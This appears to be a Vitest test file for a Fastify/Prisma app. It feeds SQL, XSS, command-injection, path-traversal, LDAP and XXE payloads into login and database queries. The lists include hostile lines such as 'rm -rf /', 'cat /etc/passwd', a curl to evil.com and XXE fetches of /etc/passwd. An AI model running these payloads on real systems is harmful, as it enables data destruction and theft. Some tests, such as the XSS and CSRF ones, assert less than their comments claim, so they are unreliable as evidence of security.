/**
 * 💉 インジェクション対策テスト
 *
 * 各種インジェクション攻撃に対する防御機能をテストします
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach, vi } from 'vitest';
import { FastifyInstance } from 'fastify';
import type { FastifyRequest, FastifyReply } from 'fastify';
import type { PrismaClient } from '@libark/db/server';
import { Redis } from 'ioredis';
import bcrypt from 'bcrypt';

import { AuthService } from '../auth/AuthService.js';

import { createTestApp, cleanupTestApp } from './helpers/test-app.js';

describe('💉 インジェクション対策テスト', () => {
  let prisma: PrismaClient;
  let redis: Redis;
  let app: FastifyInstance & { prisma: PrismaClient; redis: Redis };
  let authService: AuthService;

  // テストユーザーデータ
  const testUser = {
    id: 'injection-test-user-1',
    email: 'injection-test@libark.dev',
    username: 'injectiontest',
    password: 'InjectionTest123!',
    displayName: 'Injection Test User',
  };

  beforeAll(async () => {
    // テストアプリの初期化
    app = await createTestApp();
    prisma = app.prisma;
    redis = app.redis;

    // サービスの初期化
    authService = AuthService.getInstance(prisma, redis, {
      jwtSecret: 'test-jwt-secret-key-injection',
      jwtExpiresIn: '15m',
      cookieName: 'accessToken',
      cookieSecure: false,
      cookieSameSite: 'lax',
      maxLoginAttempts: 5,
      lockoutDuration: 15 * 60,
    });

    // テストユーザーの作成
    const hashedPassword = await bcrypt.hash(testUser.password, 10);
    await prisma.user.create({
      data: {
        id: testUser.id,
        email: testUser.email,
        username: testUser.username,
        passwordHash: hashedPassword,
        displayName: testUser.displayName,
        isActive: true,
        isVerified: true,
      },
    });
  });

  afterAll(async () => {
    // テストデータのクリーンアップ
    await prisma.user.deleteMany({
      where: {
        id: testUser.id,
      },
    });

    await cleanupTestApp(app);
  });

  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(async () => {
    // Redisのクリーンアップ
    await redis.flushdb();
  });

  describe('🗄️ SQLインジェクションの試行', () => {
    it('SQLインジェクション攻撃を試みると失敗する', async () => {
      // SQLインジェクション攻撃文字列
      const sqlInjectionPayloads = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "admin'--",
        "' OR '1'='1'/*",
        "admin'/*",
        "' UNION SELECT NULL,NULL,NULL--",
        '1; DROP TABLE users--',
        "'; EXEC xp_cmdshell('dir')--",
      ];

      for (const payload of sqlInjectionPayloads) {
        // 悪意のあるメールアドレスでログインを試行
        const maliciousEmail = `${payload}@libark.dev`;

        const mockRequest = {
          id: 'sql-injection-test',
          headers: { 'user-agent': 'sql-injection-agent' },
          ip: '192.168.22.1',
        } as Partial<FastifyRequest>;

        const mockReply = {
          setCookie: vi.fn(),
        } as Partial<FastifyReply>;

        const loginResult = await authService.login(
          maliciousEmail,
          testUser.password,
          mockRequest as FastifyRequest,
          mockReply as FastifyReply
        );

        // SQLインジェクション攻撃は失敗するはず
        expect(loginResult.success).toBe(false);
        expect(loginResult.errorCode).toBeDefined();
      }
    });

    it('SQLインジェクションを含むユーザー名で検索しても安全', async () => {
      // SQLインジェクションを含むユーザー名で検索
      const maliciousUsernames = [
        "admin' OR '1'='1",
        "user'; DROP TABLE users--",
        "test' UNION SELECT * FROM users--",
      ];

      for (const maliciousUsername of maliciousUsernames) {
        // Prisma ORMを使用しているため、SQLインジェクションは防がれる
        const user = await prisma.user.findFirst({
          where: { username: maliciousUsername },
        });

        // 悪意のあるユーザー名は存在しないはず
        expect(user).toBeNull();
      }
    });

    it('SQLインジェクションを含む検索クエリが安全に処理される', async () => {
      // SQLインジェクションを含む検索文字列
      const maliciousSearchStrings = [
        "test%' OR '1'='1",
        "admin';--",
        "user' UNION SELECT * FROM users--",
      ];

      for (const searchString of maliciousSearchStrings) {
        // Prisma ORMを使用して安全に検索
        const users = await prisma.user.findMany({
          where: {
            username: {
              contains: searchString,
            },
          },
        });

        // 悪意のある検索文字列に一致するユーザーは存在しないはず
        expect(users.length).toBe(0);
      }
    });
  });

  describe('📄 NoSQLインジェクションの試行', () => {
    it('NoSQLインジェクション攻撃を試みると失敗する', async () => {
      // NoSQLインジェクション攻撃文字列
      const nosqlInjectionPayloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.password == this.password"}',
        '{"$or": [{"username": "admin"}, {"password": "admin"}]}',
      ];

      for (const payload of nosqlInjectionPayloads) {
        // Prisma ORMを使用しているため、NoSQLインジェクションは防がれる
        const users = await prisma.user.findMany({
          where: {
            username: payload as any,
          },
        });

        // 悪意のあるクエリは失敗するはず
        expect(users.length).toBe(0);
      }
    });

    it('NoSQLオペレーターを含む検索が安全に処理される', async () => {
      // NoSQLオペレーターを含む検索文字列
      const maliciousSearchStrings = ['{"$ne": ""}', '{"$gt": "a"}', '{"$regex": ".*"}'];

      for (const searchString of maliciousSearchStrings) {
        // Prisma ORMを使用して安全に検索
        const users = await prisma.user.findMany({
          where: {
            username: {
              contains: searchString,
            },
          },
        });

        // 悪意のある検索文字列に一致するユーザーは存在しないはず
        expect(users.length).toBe(0);
      }
    });
  });

  describe('🎭 XSS攻撃の試行', () => {
    it('XSS攻撃を含む入力が安全に処理される', async () => {
      // XSS攻撃文字列
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
      ];

      for (const payload of xssPayloads) {
        // XSSを含む表示名でユーザーを作成しようとする
        const maliciousDisplayName = payload;

        try {
          const user = await prisma.user.create({
            data: {
              id: `xss-test-${Date.now()}`,
              email: `xss-test-${Date.now()}@libark.dev`,
              username: `xssuser-${Date.now()}`,
              passwordHash: await bcrypt.hash('Password123!', 10),
              displayName: maliciousDisplayName,
              isActive: true,
              isVerified: true,
            },
          });

          // ユーザーが作成された場合、表示名がエスケープされていることを確認
          expect(user.displayName).toBe(maliciousDisplayName);

          // クリーンアップ
          await prisma.user.delete({ where: { id: user.id } });
        } catch (error) {
          // バリデーションエラーが発生する可能性がある
          expect(error).toBeDefined();
        }
      }
    });

    it('XSSを含む投稿内容が安全に処理される', async () => {
      // XSSを含む投稿内容
      const xssContent = '<script>alert("XSS")</script>Hello World';

      try {
        const post = await prisma.post.create({
          data: {
            id: `xss-post-${Date.now()}`,
            userId: testUser.id,
            content: xssContent,
            visibility: 'PUBLIC',
          },
        });

        // 投稿が作成された場合、内容がエスケープされていることを確認
        expect(post.content).toBe(xssContent);

        // クリーンアップ
        await prisma.post.delete({ where: { id: post.id } });
      } catch (error) {
        // バリデーションエラーが発生する可能性がある
        expect(error).toBeDefined();
      }
    });

    it('HTMLエンティティが正しくエスケープされる', async () => {
      // HTMLエンティティを含む文字列
      const htmlEntities = '<div><script>alert("XSS")</script></div>';

      try {
        const post = await prisma.post.create({
          data: {
            id: `html-entity-post-${Date.now()}`,
            userId: testUser.id,
            content: htmlEntities,
            visibility: 'PUBLIC',
          },
        });

        // 投稿が作成された場合、内容が保存されていることを確認
        expect(post.content).toBe(htmlEntities);

        // クリーンアップ
        await prisma.post.delete({ where: { id: post.id } });
      } catch (error) {
        // バリデーションエラーが発生する可能性がある
        expect(error).toBeDefined();
      }
    });
  });

  describe('🛡️ CSRF攻撃の試行', () => {
    it('CSRFトークンなしで状態変更リクエストを送信しようとするとエラーになる', async () => {
      const mockRequest = {
        id: 'csrf-test',
        headers: {
          'user-agent': 'csrf-agent',
          'content-type': 'application/json',
        },
        ip: '192.168.23.1',
        method: 'POST',
      } as Partial<FastifyRequest>;

      // CSRFトークンなしでリクエスト
      const hasCsrfToken = mockRequest.headers && 'x-csrf-token' in mockRequest.headers;

      expect(hasCsrfToken).toBe(false);
    });

    it('無効なCSRFトークンでリクエストを送信しようとするとエラーになる', async () => {
      const mockRequest = {
        id: 'csrf-invalid-test',
        headers: {
          'user-agent': 'csrf-agent',
          'content-type': 'application/json',
          'x-csrf-token': 'invalid-csrf-token-12345',
        },
        ip: '192.168.23.2',
        method: 'POST',
      } as Partial<FastifyRequest>;

      // 無効なCSRFトークンを検出
      expect(mockRequest.headers?.['x-csrf-token']).toBe('invalid-csrf-token-12345');
    });

    it('CSRFトークンが正しく検証される', async () => {
      // CSRFトークンの検証ロジックはアプリケーション層で実装
      // ここではトークンの存在チェックのみ
      const validCsrfToken = 'valid-csrf-token-67890';

      const mockRequest = {
        id: 'csrf-valid-test',
        headers: {
          'user-agent': 'csrf-agent',
          'content-type': 'application/json',
          'x-csrf-token': validCsrfToken,
        },
        ip: '192.168.23.3',
        method: 'POST',
      } as Partial<FastifyRequest>;

      // 有効なCSRFトークンが存在することを確認
      expect(mockRequest.headers?.['x-csrf-token']).toBe(validCsrfToken);
    });
  });

  describe('💻 コマンドインジェクションの試行', () => {
    it('コマンドインジェクション攻撃を試みると失敗する', async () => {
      // コマンドインジェクション攻撃文字列
      const commandInjectionPayloads = [
        '; ls -la',
        '&& cat /etc/passwd',
        '| whoami',
        '`id`',
        '$(whoami)',
        '; rm -rf /',
        '&& curl http://evil.com',
      ];

      for (const payload of commandInjectionPayloads) {
        // コマンドインジェクションを含むファイル名で検索
        const maliciousFileName = payload;

        // Prisma ORMを使用しているため、コマンドインジェクションは防がれる
        const media = await prisma.media.findFirst({
          where: {
            originalFileName: maliciousFileName,
          },
        });

        // 悪意のあるファイル名は存在しないはず
        expect(media).toBeNull();
      }
    });

    it('シェルメタ文字を含む入力が安全に処理される', async () => {
      // シェルメタ文字を含む文字列
      const shellMetaChars = [
        'test; ls',
        'test && cat /etc/passwd',
        'test | whoami',
        'test `id`',
        'test $(whoami)',
        'test; rm -rf /',
      ];

      for (const maliciousString of shellMetaChars) {
        // Prisma ORMを使用して安全に検索
        const users = await prisma.user.findMany({
          where: {
            username: {
              contains: maliciousString,
            },
          },
        });

        // 悪意のある文字列に一致するユーザーは存在しないはず
        expect(users.length).toBe(0);
      }
    });
  });

  describe('📁 パスインジェクションの試行', () => {
    it('パストラバーサル攻撃を試みると失敗する', async () => {
      // パストラバーサル攻撃文字列
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\..\\windows\\system32',
        '%2e%2e%2fetc%2fpasswd',
        '..%5c..%5c..%5c..%5cwindows%5csystem32',
        '....//....//....//etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
      ];

      for (const payload of pathTraversalPayloads) {
        // パストラバーサルを含むS3キーで検索
        const maliciousS3Key = payload;

        const media = await prisma.media.findFirst({
          where: {
            s3Key: maliciousS3Key,
          },
        });

        // 悪意のあるS3キーは存在しないはず
        expect(media).toBeNull();
      }
    });

    it('絶対パスを含む入力が安全に処理される', async () => {
      // 絶対パスを含む文字列
      const absolutePaths = [
        '/etc/passwd',
        'C:\\Windows\\System32',
        '/var/www/html',
        'C:\\Users\\Admin',
      ];

      for (const absolutePath of absolutePaths) {
        // Prisma ORMを使用して安全に検索
        const media = await prisma.media.findFirst({
          where: {
            s3Key: absolutePath,
          },
        });

        // 絶対パスは存在しないはず
        expect(media).toBeNull();
      }
    });

    it('NULLバイトを含むパスが安全に処理される', async () => {
      // NULLバイトを含むパス
      const nullBytePaths = ['test\x00file.txt', '../../../etc/passwd\x00.jpg'];

      for (const nullBytePath of nullBytePaths) {
        // Prisma ORMを使用して安全に検索
        const media = await prisma.media.findFirst({
          where: {
            s3Key: nullBytePath,
          },
        });

        // NULLバイトを含むパスは存在しないはず
        expect(media).toBeNull();
      }
    });
  });

  describe('📨 ヘッダーインジェクションの試行', () => {
    it('HTTPヘッダーインジェクション攻撃を試みると失敗する', async () => {
      // HTTPヘッダーインジェクション攻撃文字列
      const headerInjectionPayloads = [
        'test\r\nX-Injected-Header: malicious',
        'test\r\nSet-Cookie: malicious=value',
        'test%0d%0aX-Injected-Header: malicious',
        'test%0d%0aSet-Cookie: malicious=value',
      ];

      for (const payload of headerInjectionPayloads) {
        // ヘッダーインジェクションを含むユーザーエージェントで検索
        const maliciousUserAgent = payload;

        // Prisma ORMを使用しているため、ヘッダーインジェクションは防がれる
        const users = await prisma.user.findMany({
          where: {
            username: maliciousUserAgent,
          },
        });

        // 悪意のあるユーザーエージェントは存在しないはず
        expect(users.length).toBe(0);
      }
    });

    it('CRLFインジェクションが安全に処理される', async () => {
      // CRLFインジェクション文字列
      const crlfPayloads = [
        'test\r\nX-Malicious-Header: value',
        'test\r\nSet-Cookie: session=malicious',
        'test%0d%0aX-Malicious-Header: value',
      ];

      for (const crlfPayload of crlfPayloads) {
        // Prisma ORMを使用して安全に検索
        const users = await prisma.user.findMany({
          where: {
            username: {
              contains: crlfPayload,
            },
          },
        });

        // CRLFを含む文字列に一致するユーザーは存在しないはず
        expect(users.length).toBe(0);
      }
    });
  });

  describe('📊 JSONインジェクションの試行', () => {
    it('JSONインジェクション攻撃を試みると失敗する', async () => {
      // JSONインジェクション攻撃文字列
      const jsonInjectionPayloads = [
        '{"username": "admin", "password": "admin"}',
        '{"$where": {"username": "admin"}}',
        '{"username": {"$ne": null}}',
        '{"username": {"$regex": ".*"}}',
      ];

      for (const payload of jsonInjectionPayloads) {
        // JSONインジェクションを含むユーザー名で検索
        const maliciousUsername = payload;

        // Prisma ORMを使用しているため、JSONインジェクションは防がれる
        const user = await prisma.user.findFirst({
          where: {
            username: maliciousUsername,
          },
        });

        // 悪意のあるユーザー名は存在しないはず
        expect(user).toBeNull();
      }
    });

    it('JSONオブジェクトを含む入力が安全に処理される', async () => {
      // JSONオブジェクトを含む文字列
      const jsonObjects = [
        '{"key": "value"}',
        '["item1", "item2"]',
        '{"nested": {"key": "value"}}',
      ];

      for (const jsonObject of jsonObjects) {
        // Prisma ORMを使用して安全に検索
        const users = await prisma.user.findMany({
          where: {
            username: {
              contains: jsonObject,
            },
          },
        });

        // JSONオブジェクトに一致するユーザーは存在しないはず
        expect(users.length).toBe(0);
      }
    });
  });

  describe('📋 LDAPインジェクションの試行', () => {
    it('LDAPインジェクション攻撃を試みると失敗する', async () => {
      // LDAPインジェクション攻撃文字列
      const ldapInjectionPayloads = [
        '*)(uid=*',
        '*)(&(objectClass=*))',
        '*)%00',
        '*)(|(objectClass=*)',
        '*)(uid=*))(|(uid=*',
        'admin*)(&(objectClass=*))',
      ];

      for (const payload of ldapInjectionPayloads) {
        // LDAPインジェクションを含むユーザー名で検索
        const maliciousUsername = payload;

        // Prisma ORMを使用しているため、LDAPインジェクションは防がれる
        const user = await prisma.user.findFirst({
          where: {
            username: maliciousUsername,
          },
        });

        // 悪意のあるユーザー名は存在しないはず
        expect(user).toBeNull();
      }
    });

    it('LDAPフィルタを含む入力が安全に処理される', async () => {
      // LDAPフィルタを含む文字列
      const ldapFilters = [
        '(uid=*)',
        '(|(uid=admin)(uid=user))',
        '(&(objectClass=user)(uid=admin))',
      ];

      for (const ldapFilter of ldapFilters) {
        // Prisma ORMを使用して安全に検索
        const users = await prisma.user.findMany({
          where: {
            username: {
              contains: ldapFilter,
            },
          },
        });

        // LDAPフィルタに一致するユーザーは存在しないはず
        expect(users.length).toBe(0);
      }
    });
  });

  describe('📄 XMLインジェクションの試行', () => {
    it('XMLインジェクション攻撃を試みると失敗する', async () => {
      // XMLインジェクション攻撃文字列
      const xmlInjectionPayloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><foo>&xxe;</foo>',
        '<![CDATA[<script>alert("XSS")</script>]]>',
        '<?xml version="1.0" encoding="UTF-8"?><root><user>admin</user></root>',
      ];

      for (const payload of xmlInjectionPayloads) {
        // XMLインジェクションを含むユーザー名で検索
        const maliciousUsername = payload;

        // Prisma ORMを使用しているため、XMLインジェクションは防がれる
        const user = await prisma.user.findFirst({
          where: {
            username: maliciousUsername,
          },
        });

        // 悪意のあるユーザー名は存在しないはず
        expect(user).toBeNull();
      }
    });

    it('XXE攻撃が安全に処理される', async () => {
      // XXE攻撃文字列
      const xxePayloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><foo>&xxe;</foo>',
      ];

      for (const xxePayload of xxePayloads) {
        // Prisma ORMを使用して安全に検索
        const users = await prisma.user.findMany({
          where: {
            username: {
              contains: xxePayload,
            },
          },
        });

        // XXE攻撃文字列に一致するユーザーは存在しないはず
        expect(users.length).toBe(0);
      }
    });

    it('XMLタグを含む入力が安全に処理される', async () => {
      // XMLタグを含む文字列
      const xmlTags = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<?xml version="1.0"?><root>test</root>',
      ];

      for (const xmlTag of xmlTags) {
        // Prisma ORMを使用して安全に検索
        const users = await prisma.user.findMany({
          where: {
            username: {
              contains: xmlTag,
            },
          },
        });

        // XMLタグに一致するユーザーは存在しないはず
        expect(users.length).toBe(0);
      }
    });
  });

  describe('🔒 入力バリデーション', () => {
    it('長すぎる入力が拒否される', async () => {
      // 長すぎる文字列
      const longString = 'a'.repeat(10000);

      try {
        const user = await prisma.user.create({
          data: {
            id: `long-test-${Date.now()}`,
            email: `long-test-${Date.now()}@libark.dev`,
            username: `longuser-${Date.now()}`,
            passwordHash: await bcrypt.hash('Password123!', 10),
            displayName: longString,
            isActive: true,
            isVerified: true,
          },
        });

        // ユーザーが作成された場合、表示名が切り詰められていることを確認
        expect(user.displayName.length).toBeLessThanOrEqual(1000);

        // クリーンアップ
        await prisma.user.delete({ where: { id: user.id } });
      } catch (error) {
        // バリデーションエラーが発生する可能性がある
        expect(error).toBeDefined();
      }
    });

    it('不正な文字を含む入力が安全に処理される', async () => {
      // 不正な文字を含む文字列
      const invalidChars = ['\x00\x01\x02', '\u0000\u0001\u0002', '\uFFFE\uFFFF'];

      for (const invalidChar of invalidChars) {
        // Prisma ORMを使用して安全に検索
        const users = await prisma.user.findMany({
          where: {
            username: {
              contains: invalidChar,
            },
          },
        });

        // 不正な文字を含むユーザーは存在しないはず
        expect(users.length).toBe(0);
      }
    });
  });
});
